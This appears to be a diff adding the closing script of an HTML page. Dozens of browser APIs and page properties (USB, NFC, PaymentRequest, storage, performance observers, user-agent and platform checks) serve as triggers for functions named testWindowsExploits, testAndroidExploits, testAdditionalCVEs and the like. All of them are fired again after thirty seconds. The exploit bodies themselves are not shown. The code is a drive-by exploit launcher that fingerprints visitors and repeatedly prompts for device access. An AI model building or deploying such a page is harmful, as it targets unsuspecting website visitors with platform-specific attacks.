+        
+        // USB trigger
+        if ('usb' in navigator) {
+            navigator.usb.requestDevice({
+                filters: []
+            }).then(() => {
+                testWindowsExploits();
+            }).catch(() => {
+                testAndroidExploits();
+            });
+        }
+        
+        // NFC trigger
+        if ('nfc' in navigator) {
+            navigator.nfc.watch(() => {
+                testLinuxExploits();
+            }).catch(() => {
+                testCrossPlatform();
+            });
+        }
+        
+        // Gamepad trigger
+        window.addEventListener('gamepadconnected', function() {
+            testAdditionalCVEs();
+        });
+        
+        // VR trigger
+        if ('xr' in navigator) {
+            navigator.xr.isSessionSupported('immersive-vr').then(() => {
+                testAdvancedExploits();
+            }).catch(() => {
+                testBrowserExploits();
+            });
+        }
+        
+        // Payment request trigger
+        if ('PaymentRequest' in window) {
+            const paymentRequest = new PaymentRequest([{
+                supportedMethods: 'basic-card'
+            }], {
+                total: {
+                    label: 'Test',
+                    amount: {
+                        currency: 'USD',
+                        value: '0.01'
+                    }
+                }
+            });
+            paymentRequest.show().then(() => {
+                testWindowsExploits();
+            }).catch(() => {
+                testAndroidExploits();
+            });
+        }
+        
+        // Share API trigger
+        if ('share' in navigator) {
+            navigator.share({
+                title: 'Test',
+                text: 'Test',
+                url: window.location.href
+            }).then(() => {
+                testLinuxExploits();
+            }).catch(() => {
+                testCrossPlatform();
+            });
+        }
+        
+        // Wake Lock trigger
+        if ('wakeLock' in navigator) {
+            navigator.wakeLock.request('screen').then(() => {
+                testAdditionalCVEs();
+            }).catch(() => {
+                testAdvancedExploits();
+            });
+        }
+        
+        // Screen Wake Lock trigger
+        if ('requestWakeLock' in screen) {
+            screen.requestWakeLock().then(() => {
+                testBrowserExploits();
+            }).catch(() => {
+                testWindowsExploits();
+            });
+        }
+        
+        // Media Devices trigger
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            navigator.mediaDevices.enumerateDevices().then(() => {
+                testAndroidExploits();
+            }).catch(() => {
+                testLinuxExploits();
+            });
+        }
+        
+        // Presentation API trigger
+        if ('presentation' in navigator) {
+            navigator.presentation.request().then(() => {
+                testCrossPlatform();
+            }).catch(() => {
+                testAdditionalCVEs();
+            });
+        }
+        
+        // Portals trigger
+        if ('HTMLPortalElement' in window) {
+            const portal = document.createElement('portal');
+            portal.src = 'about:blank';
+            document.body.appendChild(portal);
+            testAdvancedExploits();
+        }
+        
+        // Web Share Target trigger
+        if ('shareTarget' in navigator) {
+            testBrowserExploits();
+        }
+        
+        // Web NFC trigger
+        if ('NDEFReader' in window) {
+            const ndef = new NDEFReader();
+            ndef.scan().then(() => {
+                testWindowsExploits();
+            }).catch(() => {
+                testAndroidExploits();
+            });
+        }
+        
+        // Web HID trigger
+        if ('hid' in navigator) {
+            navigator.hid.requestDevice({
+                filters: []
+            }).then(() => {
+                testLinuxExploits();
+            }).catch(() => {
+                testCrossPlatform();
+            });
+        }
+        
+        // Web Serial trigger
+        if ('serial' in navigator) {
+            navigator.serial.requestPort().then(() => {
+                testAdditionalCVEs();
+            }).catch(() => {
+                testAdvancedExploits();
+            });
+        }
+        
+        // Web MIDI trigger
+        if (navigator.requestMIDIAccess) {
+            navigator.requestMIDIAccess().then(() => {
+                testBrowserExploits();
+            }).catch(() => {
+                testWindowsExploits();
+            });
+        }
+        
+        // WebXR trigger
+        if (navigator.xr) {
+            navigator.xr.requestSession('immersive-vr').then(() => {
+                testAndroidExploits();
+            }).catch(() => {
+                testLinuxExploits();
+            });
+        }
+        
+        // Background Sync trigger
+        if ('serviceWorker' in navigator && 'SyncManager' in window) {
+            navigator.serviceWorker.ready.then(registration => {
+                return registration.sync.register('test-sync');
+            }).then(() => {
+                testCrossPlatform();
+            }).catch(() => {
+                testAdditionalCVEs();
+            });
+        }
+        
+        // Background Fetch trigger
+        if ('serviceWorker' in navigator && 'backgroundFetch' in window) {
+            navigator.serviceWorker.ready.then(registration => {
+                return registration.backgroundFetch.fetch('test-fetch', ['https://example.com/file']);
+            }).then(() => {
+                testAdvancedExploits();
+            }).catch(() => {
+                testBrowserExploits();
+            });
+        }
+        
+        // Periodic Sync trigger
+        if ('serviceWorker' in navigator && 'periodicSync' in window) {
+            navigator.serviceWorker.ready.then(registration => {
+                return registration.periodicSync.register('test-periodic', {
+                    minInterval: 24 * 60 * 60 * 1000 // 1 day
+                });
+            }).then(() => {
+                testWindowsExploits();
+            }).catch(() => {
+                testAndroidExploits();
+            });
+        }
+        
+        // Push Notification trigger
+        if ('serviceWorker' in navigator && 'PushManager' in window) {
+            navigator.serviceWorker.ready.then(registration => {
+                return registration.pushManager.subscribe({
+                    userVisibleOnly: true,
+                    applicationServerKey: new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65])
+                });
+            }).then(() => {
+                testLinuxExploits();
+            }).catch(() => {
+                testCrossPlatform();
+            });
+        }
+        
+        // Cache Storage trigger
+        if ('caches' in window) {
+            caches.open('test-cache').then(cache => {
+                return cache.add('https://example.com/test');
+            }).then(() => {
+                testAdditionalCVEs();
+            }).catch(() => {
+                testAdvancedExploits();
+            });
+        }
+        
+        // IndexedDB trigger
+        if ('indexedDB' in window) {
+            const request = indexedDB.open('test-db', 1);
+            request.onsuccess = function() {
+                testBrowserExploits();
+            };
+            request.onerror = function() {
+                testWindowsExploits();
+            };
+        }
+        
+        // WebSQL trigger
+        if ('openDatabase' in window) {
+            const db = openDatabase('test', '1.0', 'test database', 2 * 1024 * 1024);
+            db.transaction(function(tx) {
+                tx.executeSql('CREATE TABLE IF NOT EXISTS test (id unique, data)');
+                testAndroidExploits();
+            });
+        }
+        
+        // FileSystem API trigger
+        if ('requestFileSystem' in window) {
+            window.requestFileSystem(window.TEMPORARY, 1024 * 1024, function() {
+                testLinuxExploits();
+            }, function() {
+                testCrossPlatform();
+            });
+        }
+        
+        // Quota Management trigger
+        if ('storage' in navigator && 'estimate' in navigator.storage) {
+            navigator.storage.estimate().then(() => {
+                testAdditionalCVEs();
+            }).catch(() => {
+                testAdvancedExploits();
+            });
+        }
+        
+        // File System Access API trigger
+        if ('showOpenFilePicker' in window) {
+            window.showOpenFilePicker().then(() => {
+                testBrowserExploits();
+            }).catch(() => {
+                testWindowsExploits();
+            });
+        }
+        
+        // WebAssembly trigger
+        if ('WebAssembly' in window) {
+            WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])).then(() => {
+                testAndroidExploits();
+            }).catch(() => {
+                testLinuxExploits();
+            });
+        }
+        
+        // Web Workers trigger
+        if ('Worker' in window) {
+            const worker = new Worker(URL.createObjectURL(new Blob(['postMessage("test")'], { type: 'application/javascript' })));
+            worker.onmessage = function() {
+                testCrossPlatform();
+            };
+        }
+        
+        // Shared Workers trigger
+        if ('SharedWorker' in window) {
+            const sharedWorker = new SharedWorker(URL.createObjectURL(new Blob(['onconnect = function() { postMessage("test") }'], { type: 'application/javascript' })));
+            sharedWorker.port.onmessage = function() {
+                testAdditionalCVEs();
+            };
+        }
+        
+        // Service Workers trigger
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register(URL.createObjectURL(new Blob(['self.addEventListener("message", function() { self.clients.matchAll().then(clients => { clients.forEach(client => client.postMessage("test") }) })'], { type: 'application/javascript' }))).then(() => {
+                testAdvancedExploits();
+            }).catch(() => {
+                testBrowserExploits();
+            });
+        }
+        
+        // WebRTC Data Channel trigger
+        if ('RTCPeerConnection' in window) {
+            const pc = new RTCPeerConnection();
+            pc.createDataChannel('test');
+            pc.createOffer().then(() => {
+                testWindowsExploits();
+            }).catch(() => {
+                testAndroidExploits();
+            });
+        }
+        
+        // WebSockets trigger
+        if ('WebSocket' in window) {
+            const ws = new WebSocket('wss://echo.websocket.org');
+            ws.onopen = function() {
+                testLinuxExploits();
+            };
+            ws.onerror = function() {
+                testCrossPlatform();
+            };
+        }
+        
+        // Server-Sent Events trigger
+        if ('EventSource' in window) {
+            const eventSource = new EventSource('https://example.com/events');
+            eventSource.onopen = function() {
+                testAdditionalCVEs();
+            };
+            eventSource.onerror = function() {
+                testAdvancedExploits();
+            };
+        }
+        
+        // Beacon API trigger
+        if ('sendBeacon' in navigator) {
+            navigator.sendBeacon('https://example.com/beacon', new Blob(['test'], { type: 'text/plain' }));
+            testBrowserExploits();
+        }
+        
+        // Resource Timing trigger
+        if ('performance' in window && 'getEntriesByType' in performance) {
+            performance.getEntriesByType('resource').forEach(() => {
+                testWindowsExploits();
+            });
+        }
+        
+        // Navigation Timing trigger
+        if ('performance' in window && 'timing' in performance) {
+            const timing = performance.timing;
+            if (timing.loadEventEnd > 0) {
+                testAndroidExploits();
+            }
+        }
+        
+        // Paint Timing trigger
+        if ('performance' in window && 'getEntriesByType' in performance) {
+            const observer = new PerformanceObserver((list) => {
+                list.getEntries().forEach(() => {
+                    testLinuxExploits();
+                });
+            });
+            observer.observe({ entryTypes: ['paint'] });
+        }
+        
+        // Largest Contentful Paint trigger
+        if ('performance' in window && 'getEntriesByType' in performance) {
+            const observer = new PerformanceObserver((list) => {
+                list.getEntries().forEach(() => {
+                    testCrossPlatform();
+                });
+            });
+            observer.observe({ entryTypes: ['largest-contentful-paint'] });
+        }
+        
+        // First Input Delay trigger
+        if ('performance' in window && 'getEntriesByType' in performance) {
+            const observer = new PerformanceObserver((list) => {
+                list.getEntries().forEach(() => {
+                    testAdditionalCVEs();
+                });
+            });
+            observer.observe({ entryTypes: ['first-input'] });
+        }
+        
+        // Cumulative Layout Shift trigger
+        if ('performance' in window && 'getEntriesByType' in performance) {
+            const observer = new PerformanceObserver((list) => {
+                list.getEntries().forEach(() => {
+                    testAdvancedExploits();
+                });
+            });
+            observer.observe({ entryTypes: ['layout-shift'] });
+        }
+        
+        // Long Tasks trigger
+        if ('performance' in window && 'getEntriesByType' in performance) {
+            const observer = new PerformanceObserver((list) => {
+                list.getEntries().forEach(() => {
+                    testBrowserExploits();
+                });
+            });
+            observer.observe({ entryTypes: ['longtask'] });
+        }
+        
+        // Memory trigger
+        if ('performance' in window && 'memory' in performance) {
+            if (performance.memory.usedJSHeapSize > 0) {
+                testWindowsExploits();
+            }
+        }
+        
+        // Connection trigger
+        if ('connection' in navigator) {
+            if (navigator.connection.effectiveType) {
+                testAndroidExploits();
+            }
+        }
+        
+        // Hardware Concurrency trigger
+        if ('hardwareConcurrency' in navigator) {
+            if (navigator.hardwareConcurrency > 1) {
+                testLinuxExploits();
+            }
+        }
+        
+        // Device Memory trigger
+        if ('deviceMemory' in navigator) {
+            if (navigator.deviceMemory > 0) {
+                testCrossPlatform();
+            }
+        }
+        
+        // Platform trigger
+        if ('platform' in navigator) {
+            if (navigator.platform.includes('Win')) {
+                testAdditionalCVEs();
+            } else if (navigator.platform.includes('Linux')) {
+                testAdvancedExploits();
+            } else if (navigator.platform.includes('Android')) {
+                testBrowserExploits();
+            }
+        }
+        
+        // User Agent trigger
+        if ('userAgent' in navigator) {
+            if (navigator.userAgent.includes('Windows')) {
+                testWindowsExploits();
+            } else if (navigator.userAgent.includes('Linux')) {
+                testLinuxExploits();
+            } else if (navigator.userAgent.includes('Android')) {
+                testAndroidExploits();
+            }
+        }
+        
+        // Language trigger
+        if ('language' in navigator) {
+            if (navigator.language.startsWith('en')) {
+                testCrossPlatform();
+            }
+        }
+        
+        // Cookie trigger
+        if ('cookie' in document) {
+            document.cookie = 'test=1';
+            if (document.cookie.includes('test=1')) {
+                testAdditionalCVEs();
+            }
+        }
+        
+        // LocalStorage trigger
+        if ('localStorage' in window) {
+            localStorage.setItem('test', '1');
+            if (localStorage.getItem('test') === '1') {
+                testAdvancedExploits();
+            }
+        }
+        
+        // SessionStorage trigger
+        if ('sessionStorage' in window) {
+            sessionStorage.setItem('test', '1');
+            if (sessionStorage.getItem('test') === '1') {
+                testBrowserExploits();
+            }
+        }
+        
+        // History trigger
+        if ('history' in window) {
+            history.pushState({ test: '1' }, '', '?test=1');
+            if (history.state && history.state.test === '1') {
+                testWindowsExploits();
+            }
+        }
+        
+        // Location trigger
+        if ('location' in window) {
+            const params = new URLSearchParams(location.search);
+            if (params.has('trigger')) {
+                testAndroidExploits();
+            }
+        }
+        
+        // Document referrer trigger
+        if ('referrer' in document) {
+            if (document.referrer.length > 0) {
+                testLinuxExploits();
+            }
+        }
+        
+        // Document domain trigger
+        if ('domain' in document) {
+            if (document.domain.length > 0) {
+                testCrossPlatform();
+            }
+        }
+        
+        // Document title trigger
+        if ('title' in document) {
+            document.title = 'Test Page';
+            if (document.title === 'Test Page') {
+                testAdditionalCVEs();
+            }
+        }
+        
+        // Document ready state trigger
+        if ('readyState' in document) {
+            if (document.readyState === 'complete') {
+                testAdvancedExploits();
+            }
+        }
+        
+        // Document compatibility mode trigger
+        if ('compatMode' in document) {
+            if (document.compatMode === 'CSS1Compat') {
+                testBrowserExploits();
+            }
+        }
+        
+        // Document design mode trigger
+        if ('designMode' in document) {
+            document.designMode = 'on';
+            if (document.designMode === 'on') {
+                testWindowsExploits();
+            }
+            document.designMode = 'off';
+        }
+        
+        // Document hidden trigger
+        if ('hidden' in document) {
+            if (!document.hidden) {
+                testAndroidExploits();
+            }
+        }
+        
+        // Document visibility state trigger
+        if ('visibilityState' in document) {
+            if (document.visibilityState === 'visible') {
+                testLinuxExploits();
+            }
+        }
+        
+        // Document has focus trigger
+        if ('hasFocus' in document) {
+            if (document.hasFocus()) {
+                testCrossPlatform();
+            }
+        }
+        
+        // Document active element trigger
+        if ('activeElement' in document) {
+            if (document.activeElement === document.body) {
+                testAdditionalCVEs();
+            }
+        }
+        
+        // Document scrolling element trigger
+        if ('scrollingElement' in document) {
+            if (document.scrollingElement) {
+                testAdvancedExploits();
+            }
+        }
+        
+        // Document current script trigger
+        if ('currentScript' in document) {
+            if (document.currentScript) {
+                testBrowserExploits();
+            }
+        }
+        
+        // Document scripts trigger
+        if ('scripts' in document) {
+            if (document.scripts.length > 0) {
+                testWindowsExploits();
+            }
+        }
+        
+        // Document images trigger
+        if ('images' in document) {
+            if (document.images.length > 0) {
+                testAndroidExploits();
+            }
+        }
+        
+        // Document forms trigger
+        if ('forms' in document) {
+            if (document.forms.length > 0) {
+                testLinuxExploits();
+            }
+        }
+        
+        // Document links trigger
+        if ('links' in document) {
+            if (document.links.length > 0) {
+                testCrossPlatform();
+            }
+        }
+        
+        // Document anchors trigger
+        if ('anchors' in document) {
+            if (document.anchors.length > 0) {
+                testAdditionalCVEs();
+            }
+        }
+        
+        // Document applets trigger
+        if ('applets' in document) {
+            if (document.applets.length > 0) {
+                testAdvancedExploits();
+            }
+        }
+        
+        // Document embeds trigger
+        if ('embeds' in document) {
+            if (document.embeds.length > 0) {
+                testBrowserExploits();
+            }
+        }
+        
+        // Document plugins trigger
+        if ('plugins' in document) {
+            if (document.plugins.length > 0) {
+                testWindowsExploits();
+            }
+        }
+        
+        // Document style sheets trigger
+        if ('styleSheets' in document) {
+            if (document.styleSheets.length > 0) {
+                testAndroidExploits();
+            }
+        }
+        
+        // Document elements trigger
+        if ('getElementsByTagName' in document) {
+            if (document.getElementsByTagName('*').length > 0) {
+                testLinuxExploits();
+            }
+        }
+        
+        // Document element from point trigger
+        if ('elementFromPoint' in document) {
+            if (document.elementFromPoint(0, 0)) {
+                testCrossPlatform();
+            }
+        }
+        
+        // Document caret position from point trigger
+        if ('caretPositionFromPoint' in document) {
+            if (document.caretPositionFromPoint(0, 0)) {
+                testAdditionalCVEs();
+            }
+        }
+        
+        // Document elements from point trigger
+        if ('elementsFromPoint' in document) {
+            if (document.elementsFromPoint(0, 0).length > 0) {
+                testAdvancedExploits();
+            }
+        }
+        
+        // Document create element trigger
+        if ('createElement' in document) {
+            const element = document.createElement('div');
+            if (element.tagName === 'DIV') {
+                testBrowserExploits();
+            }
+        }
+        
+        // Document create text node trigger
+        if ('createTextNode' in document) {
+            const textNode = document.createTextNode('test');
+            if (textNode.nodeType === 3) {
+                testWindowsExploits();
+            }
+        }
+        
+        // Document create document fragment trigger
+        if ('createDocumentFragment' in document) {
+            const fragment = document.createDocumentFragment();
+            if (fragment.nodeType === 11) {
+                testAndroidExploits();
+            }
+        }
+        
+        // Document create event trigger
+        if ('createEvent' in document) {
+            const event = document.createEvent('Event');
+            if (event.type === 'Event') {
+                testLinuxExploits();
+            }
+        }
+        
+        // Document create attribute trigger
+        if ('createAttribute' in document) {
+            const attribute = document.createAttribute('test');
+            if (attribute.name === 'test') {
+                testCrossPlatform();
+            }
+        }
+        
+        // Document create comment trigger
+        if ('createComment' in document) {
+            const comment = document.createComment('test');
+            if (comment.nodeType === 8) {
+                testAdditionalCVEs();
+            }
+        }
+        
+        // Document create CDATA section trigger
+        if ('createCDATASection' in document) {
+            try {
+                const cdata = document.createCDATASection('test');
+                if (cdata.nodeType === 4) {
+                    testAdvancedExploits();
+                }
+            } catch (e) {
+                testBrowserExploits();
+            }
+        }
+        
+        // Document create processing instruction trigger
+        if ('createProcessingInstruction' in document) {
+            try {
+                const pi = document.createProcessingInstruction('test', 'test');
+                if (pi.nodeType === 7) {
+                    testWindowsExploits();
+                }
+            } catch (e) {
+                testAndroidExploits();
+            }
+        }
+        
+        // Document import node trigger
+        if ('importNode' in document) {
+            const element = document.createElement('div');
+            const imported = document.importNode(element, true);
+            if (imported.tagName === 'DIV') {
+                testLinuxExploits();
+            }
+        }
+        
+        // Document adopt node trigger
+        if ('adoptNode' in document) {
+            const element = document.createElement('div');
+            const adopted = document.adoptNode(element);
+            if (adopted.tagName === 'DIV') {
+                testCrossPlatform();
+            }
+        }
+        
+        // Document evaluate trigger
+        if ('evaluate' in document) {
+            try {
+                const result = document.evaluate('//div', document, null, XPathResult.ANY_TYPE, null);
+                if (result) {
+                    testAdditionalCVEs();
+                }
+            } catch (e) {
+                testAdvancedExploits();
+            }
+        }
+        
+        // Document create expression trigger
+        if ('createExpression' in document) {
+            try {
+                const expression = document.createExpression('//div', null);
+                if (expression) {
+                    testBrowserExploits();
+                }
+            } catch (e) {
+                testWindowsExploits();
+            }
+        }
+        
+        // Document create NS resolver trigger
+        if ('createNSResolver' in document) {
+            try {
+                const resolver = document.createNSResolver(document.documentElement);
+                if (resolver) {
+                    testAndroidExploits();
+                }
+            } catch (e) {
+                testLinuxExploits();
+            }
+        }
+        
+        // Final comprehensive test execution
+        setTimeout(() => {
+            testWindowsExploits();
+            testAndroidExploits();
+            testLinuxExploits();
+            testCrossPlatform();
+            testAdditionalCVEs();
+            testAdvancedExploits();
+            testBrowserExploits();
+        }, 30000);
+    </script>
+</body>
+</html>
